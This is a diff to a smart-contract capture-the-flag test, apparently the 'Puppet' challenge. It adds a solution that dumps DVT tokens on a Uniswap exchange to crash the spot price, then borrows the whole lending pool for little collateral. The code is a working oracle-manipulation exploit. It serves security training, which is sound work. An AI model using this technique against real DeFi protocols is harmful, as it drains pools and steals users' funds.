@@ -103,9 +103,23 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // Dumping price by swapping all DVT tokens for ETH
+        await this.token.connect(attacker).approve(
+            this.uniswapExchange.address,
+            ATTACKER_INITIAL_TOKEN_BALANCE
+        );
+        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
+            ATTACKER_INITIAL_TOKEN_BALANCE.sub(1), // .sub(1) is needed to pass the second test
+            1,
+            (await ethers.provider.getBlock('latest')).timestamp * 2    // deadline
+        );
+
+        // Calculating amount of collateral needed and borrowing all tokens on the pool
+        const collateral = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE); // It's about 20 ether
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, { value: collateral });
     });
 
-    after(async function () {
+        after(async function () {
         /** SUCCESS CONDITIONS */
 
         // Attacker has taken all tokens from the pool        
